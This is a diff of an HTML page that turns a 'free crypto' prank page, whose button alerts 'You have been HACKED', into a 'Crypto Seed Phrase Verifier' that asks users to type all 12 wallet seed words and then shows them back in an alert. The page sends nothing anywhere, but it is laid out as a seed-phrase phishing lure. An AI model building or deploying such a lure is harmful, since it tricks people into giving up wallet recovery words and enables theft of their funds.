@@ -3,41 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Crypto Alert</title>
+    <title>Crypto Seed Phrase Verifier</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 50px;
+            margin: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
         button {
-            padding: 15px 30px;
-            font-size: 18px;
+            padding: 10px 20px;
+            background-color: #007BFF;
             color: white;
-            background-color: #4CAF50; /* Green background */
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
         }
         button:hover {
-            background-color: #45a049; /* Darker green on hover */
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to Free Crypto!</h1>
-    <p>Click the button below to connect your wallet and claim your free crypto:</p>
 
-    <!-- Button -->
-    <button id="connectWalletButton">Connect Your Wallet For Free Crypto</button>
+<div class="container">
+    <h2>Enter Your 12 Crypto Seed Phrases</h2>
+    
+    <!-- Input fields for each seed word -->
+    <input type="text" id="word1" placeholder="Word 1">
+    <input type="text" id="word2" placeholder="Word 2">
+    <input type="text" id="word3" placeholder="Word 3">
+    <input type="text" id="word4" placeholder="Word 4">
+    <input type="text" id="word5" placeholder="Word 5">
+    <input type="text" id="word6" placeholder="Word 6">
+    <input type="text" id="word7" placeholder="Word 7">
+    <input type="text" id="word8" placeholder="Word 8">
+    <input type="text" id="word9" placeholder="Word 9">
+    <input type="text" id="word10" placeholder="Word 10">
+    <input type="text" id="word11" placeholder="Word 11">
+    <input type="text" id="word12" placeholder="Word 12">
 
-    <script>
-        // Add an event listener to the button
-        document.getElementById('connectWalletButton').addEventListener('click', function() {
-            // Show an alert when the button is clicked
-            alert("Congratulations! You have been HACKED!!! Your wallet is now mine.");
-        });
-    </script>
+    <!-- Verify Button -->
+    <button onclick="verifySeedPhrase()">Verify</button>
+</div>
+
+<script>
+    function verifySeedPhrase() {
+        // Collect all the seed words from the input fields
+        const seedWords = [];
+        for (let i = 1; i <= 12; i++) {
+            const word = document.getElementById(`word${i}`).value.trim();
+            if (word === "") {
+                alert("Please fill in all 12 seed words.");
+                return;
+            }
+            seedWords.push(word);
+        }
+
+        // Join the seed words into a single string separated by spaces
+        const seedPhrase = seedWords.join(" ");
+
+        // Display the seed phrase in an alert box
+        alert(`Your seed phrase is: ${seedPhrase}`);
+    }
+</script>
+
 </body>
 </html>
